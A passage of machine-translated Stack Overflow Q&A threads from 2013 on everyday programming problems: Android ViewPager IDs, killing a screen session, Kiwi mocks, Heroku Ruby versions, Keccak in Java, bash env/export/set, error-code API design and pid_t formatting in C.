product = 3 * factorial(2)
current product =24
product = 4 * factorial(3)
current product =120
product = 5 * factorial(4)
120 
```

我试图弄清楚这里到底发生了什么。我不明白它是如何开始打印 n = 2 的。当前产品 = 6 是从哪里来的？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T03:04:27.717

`n==2`是您的基本情况，因此通过下一行的第一个函数是 where`n-1 == 2`或`n == 3`. 这是因为您的输出是在递归调用之后执行的，因此它首先打印最深的调用（感谢 Patricia Shanahan）。如果您希望它从大到小打印，请将您的行移到递归`println`调用的行上方。`factorial`

```
product = n * factorial(n-1); 
```

**还有**，

```
if (n <= 2){ product = n; return 2;} 
```

这是错误的，原因很多。。

它应该是

```
if (n <= 1){ return 1;} 
```

如果您无法理解这一点，请记住**每个阶乘调用都独立于其他调用**。

# android - android.content.res.Resources$NotFoundException：找不到资源 ID #0xffffffff

> ID：15262261
> 
> 赞同：75
> 
> 时间：2013-03-07T02:59:01.613
> 
> 标签：android, android-viewpager

我讨厌发布代码，并问为什么它不起作用，但我现在不知所措。我尝试在下面运行以下类，但我在 logcat 中遇到了一个我无法解释的异常。即使是谷歌搜索也很少产生结果。也许我只是不了解生态系统，但异常信息很少。我得到的例外如下：

```
03-06 21:50:43.031: E/AndroidRuntime(1013): FATAL EXCEPTION: main
03-06 21:50:43.031: E/AndroidRuntime(1013): android.content.res.Resources$NotFoundException: Unable to find resource ID #0xffffffff
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.content.res.Resources.getResourceName(Resources.java:1659)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:903)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1088)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.app.BackStackRecord.run(BackStackRecord.java:682)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.app.FragmentManagerImpl.execPendingActions(FragmentManager.java:1444)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.app.FragmentManagerImpl.executePendingTransactions(FragmentManager.java:461)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.app.FragmentPagerAdapter.finishUpdate(FragmentPagerAdapter.java:141)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.view.ViewPager.populate(ViewPager.java:1012)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.view.ViewPager.populate(ViewPager.java:881)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.support.v4.view.ViewPager.onMeasure(ViewPager.java:1366)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.View.measure(View.java:15513)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4827)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.widget.FrameLayout.onMeasure(FrameLayout.java:310)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.View.measure(View.java:15513)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.widget.LinearLayout.measureVertical(LinearLayout.java:847)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.widget.LinearLayout.onMeasure(LinearLayout.java:588)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.View.measure(View.java:15513)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4827)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.widget.FrameLayout.onMeasure(FrameLayout.java:310)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at com.android.internal.policy.impl.PhoneWindow$DecorView.onMeasure(PhoneWindow.java:2176)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.View.measure(View.java:15513)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.ViewRootImpl.performMeasure(ViewRootImpl.java:1874)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.ViewRootImpl.measureHierarchy(ViewRootImpl.java:1089)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1265)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:989)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:4351)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.Choreographer$CallbackRecord.run(Choreographer.java:749)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.Choreographer.doCallbacks(Choreographer.java:562)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.Choreographer.doFrame(Choreographer.java:532)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:735)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.os.Handler.handleCallback(Handler.java:725)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.os.Handler.dispatchMessage(Handler.java:92)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.os.Looper.loop(Looper.java:137)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at android.app.ActivityThread.main(ActivityThread.java:5039)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at java.lang.reflect.Method.invokeNative(Native Method)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at java.lang.reflect.Method.invoke(Method.java:511)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
03-06 21:50:43.031: E/AndroidRuntime(1013):     at dalvik.system.NativeStart.main(Native Method)
03-06 21:55:44.231: E/Trace(1033): error opening trace file: No such file or directory (2) 
```

我尝试将 ViewPager 移动到顶级内容（即 setContent(pager)），但这似乎不起作用。欢迎任何意见。代码如下：

**编辑***我简化了示例，但我仍然遇到同样的问题。

```
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.view.ViewPager;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.ViewGroup.LayoutParams;
import android.widget.LinearLayout;
import android.widget.TextView;

public class AskQuestionActivity extends FragmentActivity
{
    private static LayoutParams MATCH_PARENT = new LayoutParams( LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT );

    @Override
    protected void onCreate( Bundle savedInstanceState )
    {
        super.onCreate( savedInstanceState );

        ViewPager pager = new ViewPager( this );
        pager.setAdapter( new FragmentPagerAdapter( getSupportFragmentManager() )
        {
            @Override
            public int getCount()
            {
                return 1;
            }

            @Override
            public Fragment getItem( int arg0 )
            {
                return new BoardFragment();
            }
        } );

        setContentView( pager );
    }

    public static class BoardFragment extends Fragment
    {
        @Override
        public View onCreateView( LayoutInflater inflater,
                                  ViewGroup container,
                                  Bundle savedInstanceState )
        {
            TextView textView = new TextView( getActivity() );
            textView.setText( "Board" );
            textView.setGravity( Gravity.CENTER );

            LinearLayout layout = new LinearLayout( getActivity() );
            layout.setLayoutParams( MATCH_PARENT );
            layout.addView( textView );

            return layout;
        }
    }
} 
```

欢迎任何帮助。

* * *

## 回答 #1

> 赞同：86
> 
> 时间：2013-03-07T15:09:41.927

所以我会发布我认为解决我问题的方法。在我上面的代码中添加一行后，给出`ViewPager`一个“随机”ID；它设法解决了我的问题。

起初我确信设置自己的 ID 是不好的做法，但显然有合法的方法可以做到这一点。即通过创建一个**ids.xml**文件并让 Android 生态系统为您生成一个 ID。我建议查看这些 SO 帖子以获取更多信息 -[此处](https://stackoverflow.com/questions/1714297/android-view-setidint-id-programmatically-how-to-avoid-id-conflicts)和[此处](https://stackoverflow.com/questions/8937380/how-to-set-id-of-dynamic-created-layout)。

否则，我建议只为您的布局创建一个 XML 文件并将其`ViewPager`放入您的`Activity`（而不是以编程方式实例化它），但最终这一切都取决于您要完成的工作。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-07-17T07:58:48.593

```
ViewPager pager = new ViewPager(this); 
```

需要设置资源id

```
pager.setId(0x1000); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-09-10T11:29:27.303

我在布局文件夹下的 XML 布局文件中遇到了类似的问题。该代码曾经在 Eclipse 中工作，但是当项目转移到 Android Studio 时，我不断收到 android.content.res.Resources$NotFoundException。

为了解决这个问题，我最终重命名了导致问题并解决了问题的 XML 文件。在此之前，我尝试重建项目，对 XML 文件进行修改，但都没有奏效。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-06-04T04:32:01.490

现在在 2021 年，这个问题在我的 Xamarin Forms 中遇到了我，其 AppShell 运行良好，但是在升级到许多 Google AndroidX Nuget Packages 的最后一个版本后，当打开菜单更改为另一个时，开始崩溃并出现此帖子的消息错误页。我的解决方案：我将所有库一个一个降级到以前的版本，罪魁祸首似乎是**Xamarin.AndroidX.Legacy.Support.V4**。v1.0.0.6 是最后一个对我来说没有问题的版本。我不知道原因。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-11-25T01:01:00.960

完全相同的问题。我以编程方式在片段中生成了一个 viewpager。当片段回到前台时它崩溃了。

即使，我已经为视图寻呼机生成了一个随机 ID，但它仍然会崩溃。唯一的方法是为其分配一个固定的 Id。诡异的！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-02-06T18:09:12.490

我有同样的错误。我的原因是我的 Adapter 类有一个额外的 textView 没有匹配的 imageView。我有 7 个 TextView，只有 6 个 ImageView。我花了几个小时才弄清楚一个简单的错误。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-07-20T06:28:31.370

我在设置 adapter 时遇到了同样的异常`viewPager.setAdapter(adapter);`，仅在 Android KitKat 4.4 中。我尝试了几乎所有的解决方案，但没有奏效。

就我而言，解决方案是当我将**.xml**文件**drawable-nodpi**移动到**可绘制**文件夹（这是一些 SVG 图像），`Build -> Clean Project`然后错误消失了。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-07-21T06:14:57.257

我遇到过同样的问题。问题是缺少布局文件。我已将布局放在 layout-xlarge 文件夹中，但没有放在布局文件夹中。所以小屏幕平板电脑就有这个问题。这可能会给一些人一个线索。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-12-30T05:47:31.227

我知道这是一个老问题，但也许我找到的解决方案可以帮助任何有类似问题的人......

我收到的错误消息是神秘的 'Android.Content.Res.Resources+NotFoundException: 'Unable to find resource ID #0x0' - 只有 'resource ID' 与原始问题不同。

经过大量研究，我终于发现崩溃与对 PushModalAsync() 的调用有关，尽管我不知道为什么......

最终为我解决了这个问题的解决方案可以在 styles.xml 文件中找到。我已经为 android:windowBackground 分配了 #00ffffff 的值。事实证明，任何十六进制颜色`<item name="android:windowBackground">#000000</item>`都会抛出这个异常。

解决方法是在colors.xml文件中指定十六进制颜色，然后在styles.xml中引用这个颜色，比如`<item name="android:windowBackground">@color/window_background</item>`

这是让我走上正轨的“错误”报告...[当 android:windowBackground 设置为 HEX 时，PushModalAsync() 上引发异常](https://github.com/xamarin/Xamarin.Forms/issues/10007)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-05-04T07:29:25.010

我试图直接设置一个`Int`值`TextView`。

`String`通过在将其设置为 之前将值转换为 来解决`TextView`。

# linux - 如何在运行 .sh 时终止屏幕？

> ID：15262263
> 
> 赞同：0
> 
> 时间：2013-03-07T02:59:13.527
> 
> 标签：linux

我到处搜索，但没有找到我的问题的解决方案，请帮忙！

我的情况：

我需要在我的 AWS（亚马逊网络服务）中运行一个巨大的 .sh，完成这项工作大约需要 4-5 个小时，我不想坐下来看看那些日志，所以我创建了一个屏幕来运行它（屏幕 1），但是当我配置安装时，我犯了一个愚蠢的错误来创建另一个屏幕并配置并执行（屏幕 2）。

问题是：

屏幕2完成工作，我'退出'屏幕（终止），但我无法终止屏幕1，因为当我输入'exit'时，它成为配置参数，CTRL + A + K也不起作用，请告诉我如何才能杀死这个屏幕，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:25:04.567

`KILL -9 <pid>`成功了。如果您希望它在后台运行，请为父进程执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:03:53.780

登录到另一个会话。

```
ps -ef  | grep yourusername 
```

将向您显示您拥有的正在运行的进程。最左边的数字是进程的 pid。

`kill`对要停止的进程发出命令。

```
kill [pid] 
```

如果失败尝试

```
kill -9 [pid] 
```

# objective-c - 如何在 Kiwi 中为模拟方法设置参数期望

> ID：15262264
> 
> 赞同：2
> 
> 时间：2013-03-07T02:59:22.603
> 
> 标签：objective-c, tdd, kiwi, ocmockito, ochamcrest

使用 OCMockito 和 OCHamcrest，我可以对模拟方法的参数设置期望，因此：

```
[verify(aMockObject) doSomething:allOf(is(instanceOf([NSArray class])), hasCountOf(3U), nil)]; 
```

使用 Kiwi 似乎没有同样简单的方法可以做到这一点。可以使用间谍来捕获参数，例如：

```
KWCaptureSpy *spy = [aMockObject captureArgument:@selector(doSomething:) atIndex:0];
NSArray *capturedArray = spy.argument; 
```

然后检查对捕获对象的期望：

```
[[capturedArray should] haveCountOf:3U]; 
```

在 Kiwi 中是否有一种不那么笨拙的方法来做到这一点？

（我知道我可能可以在这里使用 hamcrest 匹配器，但目前我正在探索 Kiwi 的能力）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-28T03:04:22.113

我使用的一个选项是`stub:withBlock:`

```
NSArray* capturedArray; // declare this as __block if needed
[aMockObject stub:@selector(doSomething:)
        withBlock:^id(NSArray *params) {
            capturedArray = params[0];
            // this is necessary even if the doSomething method returns void
            return nil;
        }];
// exercise your object under test, then:
[[capturedArray should] haveCountOf:3U]; 
```

这很好用，而且我发现它比间谍模式更容易实现。但是你的问题让我想知道[使用消息模式的期望](https://github.com/allending/Kiwi/wiki/Expectations#message-patterns)。例如：

```
[[[aMockObject should] receive] doSomething:myArray];
[[[aMockObject should] receive] doSomething:any()]; 
```

第一个示例将验证`aMockObject`接收到`doSomething:`带有参数的消息`isEqual:myArray`。第二个示例将简单地验证`doSomething:`已发送，而不期望数组参数。如果我们可以在消息模式中指定某种类型的 Matcher 那就太好了，以表示我们不在乎在消息中发送什么特定的数组实例，只关心它的 a`count`为 3。

我还没有找到任何能够做到这一点的例子，但看起来有一些可能性。为了验证消息发送期望，Kiwi 使用`KWMessagePattern`类，特别是`matchesInvocation:`and`argumentFiltersMatchInvocationArguments:`方法。这将检查三种类型的“参数过滤器”：

1.  文字对象值（如`myArray`上面的示例中），与消息中发送的实际值进行比较，使用`isEqual:`
2.  一个类型的对象`KWAny`（`any()`例如上面示例中的宏），它将匹配任何参数值
3.  满足`[KWGenericMatchEvaluator isGenericMatcher:argumentFilter]`的对象，这基本上意味着对象响应`matches:(id)obj`

因此，您应该能够使用`matches:`在消息模式期望中实现的对象来执行诸如验证发送到存根方法的数组长度之类的事情，而无需求助于 spys 或块。这是一个非常简单的实现：（**[作为 Gist 提供](https://gist.github.com/mmertsock/5260189)**）

```
// A reusable class that satisfies isGenericMatcher:
@interface SOHaveCountOfGenericMatcher : NSObject
- (id)initWithCount:(NSUInteger)count;
- (BOOL)matches:(id)item; // this is what KWMessagePattern looks for
@property (readonly, nonatomic) NSUInteger count;
@end

@implementation SOHaveCountOfGenericMatcher
- (id)initWithCount:(NSUInteger)count
{
    if (self = [super init]) {
        _count = count;
    }
    return self;
}
- (BOOL)matches:(id)item
{
    if (![item respondsToSelector:@selector(count)])
        return NO;
    return [item count] == self.count;
}
@end

// Your spec:
it(@"should receive an array with count 3", ^{
    NSArray* testArray = @[@"a", @"b", @"c"];
    id argWithCount3 = [[SOHaveCountOfGenericMatcher alloc] initWithCount:3];
    id aMockObject = [SomeObj nullMock];
    [[[aMockObject should] receive] doSomething:argWithCount3];
    [aMockObject doSomething:testArray];
}); 
```

能够在这里重用 Kiwi 的内置匹配器类会很好，但我还没有确切地知道如何做到这一点。

# ruby-on-rails - 如何指定 Cedar 使用 ree 1.8.7？

> ID：15262272
> 
> 赞同：0
> 
> 时间：2013-03-07T03:00:21.280
> 
> 标签：ruby-on-rails, ruby, heroku, cedar

我正在使用 ruby​​ 1.8.7 在 Heroku 上运行 rails 2.3.16 应用程序。

我知道我应该升级到 rails 3，但在我有更多时间之前，我想在我的 Heroku 应用程序上使用 REE 1.8.7 而不是 MRI 1.8.7。Cedar 支持 REE 似乎基于：

[https://devcenter.heroku.com/articles/stack](https://devcenter.heroku.com/articles/stack)

我在我的 Gemfile 中指定我的 ruby​​ 版本

红宝石“1.8.7”

我想我可以通过指定一个引擎来做到这一点：

红宝石“1.8.7”，：engine =>“ree”，：engine_version =>“2012.02”

但是在我尝试之后，由于明显的原因，这并没有最终奏效。

我很想运行 ree，即使它已经达到生命支持，直到我可以升级，因为所有的安全性和性能提升。

在雪松上运行 ruby​​ 1.8.7 是否会自动运行 ree？

有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T08:50:07.373

Cedar 没有安装 REE 1.8.7，但您应该能够使用 1.8.7 MRI

```
ruby "1.8.7" 
```

在您的 Gemfile 中。[您可以在 Heroku 网站https://devcenter.heroku.com/articles/cedar-migration](https://devcenter.heroku.com/articles/cedar-migration)上阅读有关此内容的更多信息，但恐怕他们鼓励您使用 1.9.2。

# java - 意外的 keccak 输出

> ID：15262280
> 
> 赞同：0
> 
> 时间：2013-03-07T03:00:50.787
> 
> 标签：java, keccak

我正在试验 Java 的各种[Keccak](http://en.wikipedia.org/wiki/SHA-3)实现。 [到目前为止，这个实现](https://github.com/romus/sha/blob/master/sha3/src/com/theromus/sha/Keccak.java)是最有希望的，但是我得到了奇怪的结果。测试用例[在这里](https://github.com/romus/sha/blob/master/sha3/src/com/theromus/test/Main.java)定义（尽管我直接使用十六进制字符串，根据测试向量）。当前（和正确的）测试向量在[此处](https://hashlib.codeplex.com/SourceControl/diff/file/view/77942?fileId=1104881)以绿色定义（为了方便起见，我提供了链接，以使任何人不必从网站下载官方测试向量 zip 文件）。

对于初学者，我不了解测试向量中“len”和“msg”字段之间的相关性。'Len' 应该是 'msg' 的长度，以位为单位。例如，'len' = 5，'msg' = "48"（一个十六进制字符串），我认为 2 个十六进制数字 = 1 个字节，这 = 8 位。我错过了什么？

我只得到以下长度的输入的正确摘要（根据测试向量）：16、24、40、56、64、72、112 和 128（其中长度对应于测试向量，输入是'msg'）。但是，我得到的长度值：32、48、80、88、96、104 与测试向量不匹配。任何人都可以对为什么会发生这种情况做出有根据的猜测吗？当然，如果有人可以推荐 Java 中的不同实现，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-09T11:07:35.370

看这里的例子：[LINK](https://github.com/romus/sha/blob/master/sha3/src/com/theromus/example/Main.java)

或者只是将此方法添加到“Keccak”类：

```
/**
 * @param string original string to get kekkan hash from it
 * @return hash or null
 */
public static String generateHash(String string) {
    Keccak keccak = new Keccak();
    String hex;
    try {
        hex = keccak.getHexStringByByteArray(string.getBytes("UTF-8"));
    } catch (UnsupportedEncodingException e) {
        return null;
    }
    // 576,64 is values for sha-512
    return keccak.getHash(hex, 576, 64);
} 
```

# iphone - 带有 ContentOffset 的 UIScrollview 缩放

> ID：15262288
> 
> 赞同：1
> 
> 时间：2013-03-07T03:01:33.053
> 
> 标签：iphone, ios, objective-c, uiscrollview

我正在制作一个应用程序，允许用户将图像导入到`UIScrollView`他们可以滚动和定位的位置。其他元素位于 顶部`UIScrollView`，然后通过拍摄整个视图的快照来创建图像。

这很好用，一切都很好。然后我不得不将图像上传到 Facebook。Facebook 显着放大了图像，所以我需要增加图像的大小。所以我应该扩大所有元素并拍摄快照，应该可以正常工作，对吧？

但是，我无法匹配放大后的`contentOffset`。`UIScrollView`我已经尝试了各种数学方程（一些是我自己的，其他的在这里找到），似乎没有任何东西与缩放后的偏移量相匹配。

从概念上讲，我认为这应该可行，但它不会：

```
 NSLog(@"Starting offset X: %f",self.imageScroll.contentOffset.x);
    NSLog(@"Starting offset Y: %f",self.imageScroll.contentOffset.y);

    self.imageScroll.transform = CGAffineTransformMakeScale(4, 4);

    CGPoint offset = self.imageScroll.contentOffset;
    float newX = offset.x*4;
    float newY =  offset.y*4;
    NSLog(@"Scaled offset X: %f",newX);
    NSLog(@"Scaled offset Y: %f",newY);

    self.imageScroll.contentOffset = CGPointMake(newX, newY); 
```

我很感激你的时间。

# wpf - Telerik RadTreeListView：在行中附加事件

> ID：15262290
> 
> 赞同：0
> 
> 时间：2013-03-07T03:01:50.293
> 
> 标签：wpf, telerik, radtreelist

我在我的 WPF 应用程序中使用 Telerik radgridview

```
 <telerik:RadTreeListView Grid.Row="1" Grid.ColumnSpan="2"
              Name="WorkPreferenceTreeView"
              AutoGenerateColumns="false"
              IsReadOnly="True"
              ItemsSource="{Binding ItemsSource, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type Views:WorkPreferenceSelectorView}}}"
              RowIndicatorVisibility="Collapsed"
              SelectedItem="{Binding SelectedItem, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type Views:WorkPreferenceSelectorView}}}" 
              ScrollViewer.HorizontalScrollBarVisibility="Hidden">

            <TelerikNavigation:RadContextMenu.ContextMenu>
                <TelerikNavigation:RadContextMenu x:Name="RadContextMenu" />
            </TelerikNavigation:RadContextMenu.ContextMenu>

            <telerik:RadTreeListView.ChildTableDefinitions>
                <telerik:TreeListViewTableDefinition  ItemsSource="{Binding ItemPreferences}"  />
            </telerik:RadTreeListView.ChildTableDefinitions>

            <telerik:RadTreeListView.Columns>

                <telerik:GridViewDataColumn MinWidth="200" Width="*" CellTemplate="
              {StaticResource ItemPreferenceskPreferenceCellTemplate}" Header="Preference" IsFilterable="false"
ShowFieldFilters="false" Name="A" /> 
```

我在控件上附加了一个事件

```
 private void InitializeControl()
    {
        WorkPreferenceTreeView.MouseDoubleClick += (WorkPreferenceTreeView_MouseDoubleClick);
     } 
```

现在我的问题是当我双击 radtreelistview 中的 ANYWHERE（甚至在滚动条中）时，MouseDoubleClick 事件就会触发，我只想在双击选定的项目或行时触发它。我想知道我是否可以在所选项目或每一行中附加 MouseDoubleClick，但我没有找到方法来做到这一点。有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-05T08:59:01.090

在您的示例中，您确实将事件附加到了网格本身。

实际上，您需要在 Row 上附加事件！

你可以用**RowStyle做到这一点**

（在本例中，双击将切换 IsExpanded 行属性）

```
<telerik:RadTreeListView ... >
     <telerik:RadTreeListView.RowStyle>
          <Style TargetType="telerik:TreeListViewRow">
               <EventSetter
                    Event="MouseDoubleClick"
                    Handler="HandleRowDoubleClick" />
          </Style>
     </telerik:RadTreeListView.RowStyle>
</telerik:RadTreeListView> 
```

和背后的代码

```
public void HandleRowDoubleClick(object sender, RoutedEventArgs e)
{
    var row = sender as Telerik.Windows.Controls.GridView.GridViewRow;
    row.IsExpanded = !row.IsExpanded;
} 
```

请享用 ：）

# bash - 在 Solaris 的 Bash Shell 下输入命令“env”、“export”、“set”后的命令输出有什么不同？

> ID：15262292
> 
> 赞同：3
> 
> 时间：2013-03-07T03:02:10.343
> 
> 标签：bash, shell, export, solaris, env

操作系统：Solaris

外壳：重击外壳

场景：分别输入命令：“env”、“export”和“set”（不带任何参数），将返回一个变量和值列表。

我的问题：输入三个命令后返回的值有什么区别？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T05:04:02.570

`env`and`export`命令产生相同的信息，但格式不同。And `bash`'s产生与or (Bourne) shell 版本`export`的输出完全不同的输出。`ksh`请注意，`set`and`export`是 shell 内置命令，但`env`它是一个外部命令，除了列出环境的内容之外还有其他用途（尽管这是它的用途之一）。

该`set`命令列出了您创建的变量。这包括环境变量、常规（非环境）变量*和*函数定义（我们将在此忽略）。

考虑：

```
x1=abc
x2=def; export x2
export x3=ghi 
```

有两个导出变量（`x2`和`x3`）和一个常规（非导出）变量。该`set`命令将列出所有三个；`export`并且`env`只会列出导出的。

该[`env`](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/env.html)命令的输出由 POSIX 标准规定。这只是变量名称和值，后跟换行符：

```
name=value 
```

经典地，Bourne shell 简单地以相同的方式列出变量`set`和`export`。

如果值包含空格或其他需要保护的字符，Korn shell 会将值括在引号中，否则使用该`name=value`符号。

`set`in 命令生成赋值，其`bash`值用引号保护。但是，输出`export`是`declare -x var=value`带引号保护的。一般的想法可能是您可以使用`export > file`后跟`source file`将环境变量重置为您执行`export`.

* * *

### 概括

1.  并非所有的 shell 变量都是环境变量。
2.  该`set`命令列出所有 shell 变量，也可能列出函数。
3.  该`export`命令列出环境变量。
4.  和命令内置在 shell 中`set`。`export`
5.  不带参数的`env`命令列出了它从执行它的进程继承的环境。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:13:12.707

该`set`命令向您显示会话中定义的所有 shell 变量。

该`export`命令列出了上述的一个子集（通常）。这些是使用`export`或`declare -x`: 全局可见的变量创建的 - 即，对子进程可见。

该`env`命令用于启用将脚本从帐户移植到另一个帐户或机器到机器。env 在修改或不同的环境中运行程序。

# api - getLastErrorCode() 是返回错误代码的良好 API 设计吗？

> ID：15262305
> 
> 赞同：1
> 
> 时间：2013-03-07T03:02:58.753
> 
> 标签：api, oop, error-handling

返回错误代码的最佳做法是什么？

有时我们会遇到类方法操作不成功的情况，但*也不*例外。如果失败的原因多种多样，那么我们需要一种方法来告诉调用者失败的原因。

例如，我有`Actor::equipItem()`将项目装备到 RPG 角色对象的方法。失败的原因可能是：

*   人物等级不够高。
*   角色职业无法装备该物品。
*   人物属性不够（如强度不够）。
*   该项目已损坏。
*   该物品是一把双手武器，角色已经挥舞着匕首。
*   等等

在我看来，上述情况并不例外。我可以`Actor::equipItem()`通过两种方式实现。

*   首先是返回`int`码，比如`0`成功和`1`等级不够，`2`错误的字符类等等。
*   第二个是返回 boolean `TRUE`or `FALSE`，并实现`Actor::getLastErrorCode()`调用者可以检查它是否需要向用户提供反馈。

两者中哪一个是 OOP 和 API 设计方面的最佳实践？有替代品吗？是否有处理非异常情况的错误代码的最佳实践？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T03:34:42.107

就像我说的，我同意 cHao 的观点，即抛出异常是处理这个问题的正确方法。但是，我想评论一下您可能决定如何处理所有这些规则。这种情况对于规则引擎来说是一个完美的情况，使用良好的 ol' 多态性。（检查责任链（CoR）设计模式将对此有好处。）

你可以在你的方法中使用一堆`if`语句。或者，更好的是，让每个`if`检查都有自己的类，实现类似 IEquipItemRule 的东西：

```
public interface IEquipItemRule
{
    bool CanEquip();
} 
```

`if`然后，您的消费代码可以处理所有规则，而不是语句：

```
List<IEquipItemRule> equipRules = GetEquipRules();  // This is where the CoR pattern comes in

foreach (IEquipItemRule rule in equipRules)
{
    // Note: Instead of throwing immediately, you could collect all of the
    //       messages and return all of the failure reasons.
    if (!rule.CanEquip()) { throw new AppropriateException(rule.Message); }
} 
```

这样做的好处是这个检查可以用它自己的方法。所以，如果你想先检查这个方法是否成功，消费者可以调用上面的代码。当实际方法运行时，它也可以调用这个检查代码。

注意：设备规则的示例可能如下所示：

```
public class CharacterLevelRule : IEquipItemRule
{
    public bool CanEquip()
    {
        if (characterLevel <= necessaryLevel) { return false; }
        return true;
    }
} 
```

# internet-explorer - Chrome 缓存文件需要多长时间？

> ID：15262307
> 
> 赞同：0
> 
> 时间：2013-03-07T03:03:10.563
> 
> 标签：internet-explorer, google-chrome, firefox, caching

我只是在闲逛。我敢肯定，我不是唯一一个徘徊于此的人。

我在 Chrome 缓存 .js 文件方面遇到了一些问题，并且在我需要它们时它们没有被重新加载。

有谁知道..文件缓存需要多长时间？它会在一段时间后重置吗？重启浏览器后会重置吗？你的电脑？需要多少次点击？一个还是多个？

有一堆问题。主要的是.. 缓存系统如何在 Chrome 上工作？（或这种情况下的其他浏览器..）

我真的不太了解缓存文件。哈哈。

谢谢。

# asp.net - ASP.NET Web API 响应结果格式

> ID：15262311
> 
> 赞同：0
> 
> 时间：2013-03-07T03:03:28.400
> 
> 标签：asp.net, asp.net-web-api

我正在使用 ASP.NET Web API。

我的模型是

```
public class DataModel
{
    public int Id {get;set;}

     [XmlText]
    public string RowList { get; set; }
} 
```

RowList 属性是 xml 。

响应如下：

[响应 xml 的图像](http://i.stack.imgur.com/E6Zim.png)

现在结果为 xml 格式，但响应结果已编码。在将结果响应给客户端之前，如何以正确的格式解码 RowList。

谢谢。

# c - 如何将pid_t转换为字符串

> ID：15262315
> 
> 赞同：4
> 
> 时间：2013-03-07T03:03:46.313
> 
> 标签：c, pid

所以，我需要 strcat pid 到某个字符串。我有这个

```
strcat (str,(char*)getpid()); 
```

但这不起作用。

- - 编辑 - -

好的，我理解反对意见。我太快发布问题了。并没有意识到 pid 返回一个 int，我不能将一个 int 转换为 char*

itoa 不起作用，因为它不是标准的 c。

我就是这样做的。

```
char pid[10];
snprintf(pid, 10,"%d",(int)getpid());
strcat (str, pid); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-07T03:06:52.083

与其使用`strcat`来构建字符串，不如考虑使用更灵活（更高效！）的`sprintf`/`snprintf`函数：

```
char *end = str;
end += sprintf(end, "%s ", "hello!");
end += sprintf(end, "%ld", (long)getpid());
if(bar)
    end += sprintf(end, "%x", 0xf00d); 
```

